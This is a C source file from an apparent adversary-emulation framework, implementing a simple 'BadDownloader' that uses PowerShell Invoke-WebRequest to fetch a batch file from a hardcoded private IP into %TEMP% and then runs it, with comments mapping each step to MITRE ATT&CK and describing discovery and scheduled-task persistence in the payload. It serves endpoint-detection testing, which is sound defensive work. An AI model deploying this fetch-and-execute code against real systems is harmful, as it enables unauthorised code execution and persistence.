/*
 * ============================================================================
 * ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY
 *
 * This code replicates documented malware behavior for defensive security
 * testing and endpoint telemetry validation. It does NOT contain real malware
 * payloads, exploits, or evasion techniques.
 *
 * LEGAL: Only run this in environments you own or have explicit written
 * authorization to test. Unauthorized use may violate computer fraud laws.
 *
 * Final payload: calc.exe (safe, benign)
 * C2: Local network only (hardcoded private IP: 192.168.0.148)
 * ============================================================================
 *
 * BadDownloader Stage 1 — Simple Downloader Binary
 *
 * Emulates: Generic "script kiddie" downloader behavior
 *
 * This is an intentionally unsophisticated downloader. No evasion, no
 * obfuscation, no anti-analysis. The simplicity is the point: even basic
 * threats leave detectable traces in endpoint telemetry.
 *
 * Attack chain:
 *   1. BadDownloader.exe spawns cmd.exe
 *   2. cmd.exe runs PowerShell Invoke-WebRequest to download .bat payload
 *   3. cmd.exe executes the downloaded .bat file
 *   4. .bat runs discovery commands, creates persistence, launches calc.exe
 *
 * Build: See Makefile (cross-compile with mingw-w64)
 *
 * ============================================================================
 */

#include <windows.h>  /* Windows API: CreateProcess, GetEnvironmentVariable, etc. */
#include <stdio.h>    /* printf for operator status messages */
#include <string.h>   /* strlen, snprintf */

/* ============================================================================
 * SAFETY: Hardcoded safe values — NOT configurable
 * ============================================================================
 * These values are intentionally hardcoded. Someone who wants to change them
 * must modify this source code and recompile. This is a deliberate safety
 * mechanism.
 */

/* C2/payload server — private RFC1918 IP only */
#define C2_URL "http://192.168.0.148:8888/baddownload.bat"

/* Download destination — %TEMP%\baddownload.bat */
#define PAYLOAD_FILENAME "baddownload.bat"

/* ============================================================================
 * run_command — Execute a command via CreateProcess and wait for completion
 * ============================================================================
 *
 * Spawns cmd.exe /c <command> as a child process and waits for it to finish.
 * Uses CreateProcessA (ANSI version) with a writable command line buffer,
 * as required by the Windows API.
 *
 * Parameters:
 *   cmd_line — The full command string to execute via cmd.exe /c
 *
 * Returns:
 *   TRUE if the process was created and completed, FALSE otherwise.
 */
static BOOL run_command(const char* cmd_line) {
    STARTUPINFOA si;        /* Startup configuration for the child process */
    PROCESS_INFORMATION pi; /* Receives handles to the created process */
    char buf[2048];         /* Writable buffer — CreateProcessA requires this */

    /* Zero-initialize the startup info structure */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);     /* Must set cb to the size of the structure */

    /* Zero-initialize the process information structure */
    ZeroMemory(&pi, sizeof(pi));

    /*
     * Copy the command into a writable buffer.
     * CreateProcessA modifies lpCommandLine in-place, so passing a string
     * literal directly would cause an access violation.
     */
    snprintf(buf, sizeof(buf), "cmd.exe /c %s", cmd_line);

    /*
     * CreateProcessA parameters:
     *   lpApplicationName:    NULL — let Windows parse the command line
     *   lpCommandLine:        Our cmd.exe /c command (writable buffer)
     *   lpProcessAttributes:  NULL — default security for the process
     *   lpThreadAttributes:   NULL — default security for the thread
     *   bInheritHandles:      FALSE — child doesn't inherit our handles
     *   dwCreationFlags:      0 — normal window creation
     *   lpEnvironment:        NULL — inherit our environment variables
     *   lpCurrentDirectory:   NULL — inherit our working directory
     *   lpStartupInfo:        Basic startup info (zeroed)
     *   lpProcessInformation: Receives process and thread handles
     */
    if (!CreateProcessA(
            NULL,       /* No application name — use command line */
            buf,        /* Command line (writable buffer) */
            NULL,       /* Default process security */
            NULL,       /* Default thread security */
            FALSE,      /* Don't inherit handles */
            0,          /* No special creation flags */
            NULL,       /* Inherit environment */
            NULL,       /* Inherit working directory */
            &si,        /* Startup info */
            &pi         /* Process info output */
        )) {
        /* CreateProcess failed — print the Windows error code */
        printf("[!] CreateProcess failed (error %lu)\n", GetLastError());
        return FALSE;
    }

    /*
     * Wait for the child process to complete.
     * 60-second timeout — Invoke-WebRequest may take a few seconds to
     * download the payload, and systeminfo in the .bat can take 10+ seconds.
     */
    WaitForSingleObject(pi.hProcess, 60000);

    /* Clean up process and thread handles to prevent resource leaks */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

/* ============================================================================
 * main — Entry point
 * ============================================================================
 *
 * The downloader performs two steps:
 *   1. Download the .bat payload from the C2 server using PowerShell
 *   2. Execute the downloaded .bat payload
 *
 * Both steps use cmd.exe as an intermediary, creating the process tree:
 *   BadDownloader.exe → cmd.exe → powershell.exe (download)
 *   BadDownloader.exe → cmd.exe → baddownload.bat → discovery commands
 */
int main(void) {
    char temp_path[MAX_PATH];  /* Buffer for the %TEMP% directory path */
    char download_cmd[2048];   /* Buffer for the PowerShell download command */
    char execute_cmd[1024];    /* Buffer for the .bat execution command */

    /* Print banner so the operator knows the emulation is running */
    printf("============================================================\n");
    printf("  Esinta Emulation Framework - BadDownloader\n");
    printf("  FOR AUTHORIZED SECURITY TESTING ONLY\n");
    printf("============================================================\n\n");

    /*
     * Step 1: Resolve %TEMP% directory path
     *
     * GetEnvironmentVariableA retrieves the value of the TEMP environment
     * variable, which typically resolves to something like:
     *   C:\Users\<username>\AppData\Local\Temp
     *
     * We need this to know where to save the downloaded payload.
     */
    if (!GetEnvironmentVariableA("TEMP", temp_path, sizeof(temp_path))) {
        printf("[!] Failed to resolve %%TEMP%% (error %lu)\n", GetLastError());
        return 1;
    }
    printf("[*] TEMP directory: %s\n", temp_path);

    /*
     * Step 2: Download the .bat payload from the C2 server
     *
     * MITRE ATT&CK:
     *   T1059.001 — PowerShell (Invoke-WebRequest download cradle)
     *   T1105    — Ingress Tool Transfer (HTTP download of payload)
     *
     * We use PowerShell's Invoke-WebRequest cmdlet to download the .bat
     * file from the MacBook C2 server. This creates the process tree:
     *   BadDownloader.exe → cmd.exe → powershell.exe
     *
     * The download URL is hardcoded to a private IP (safety mechanism).
     */
    printf("[*] Downloading payload from %s\n", C2_URL);

    snprintf(download_cmd, sizeof(download_cmd),
        "powershell.exe Invoke-WebRequest \"%s\" -OutFile \"%s\\%s\"",
        C2_URL, temp_path, PAYLOAD_FILENAME);

    printf("[*] Running: %s\n", download_cmd);

    if (!run_command(download_cmd)) {
        printf("[!] Download failed.\n");
        return 1;
    }
    printf("[+] Download complete.\n\n");

    /*
     * Step 3: Execute the downloaded .bat payload
     *
     * MITRE ATT&CK:
     *   T1059.003 — Windows Command Shell (cmd.exe runs .bat file)
     *   T1204.002 — User Execution: Malicious File
     *
     * The .bat file contains discovery commands, persistence, and the
     * safe payload (calc.exe). Executing it via cmd.exe creates:
     *   BadDownloader.exe → cmd.exe → baddownload.bat
     *     → whoami, ipconfig, systeminfo, net user
     *     → schtasks (persistence)
     *     → calc.exe (safe payload)
     */
    printf("[*] Executing payload...\n");

    snprintf(execute_cmd, sizeof(execute_cmd),
        "\"%s\\%s\"", temp_path, PAYLOAD_FILENAME);

    printf("[*] Running: %s\n", execute_cmd);

    if (!run_command(execute_cmd)) {
        printf("[!] Payload execution failed.\n");
        return 1;
    }

    printf("\n[+] BadDownloader emulation complete.\n");
    return 0;
}
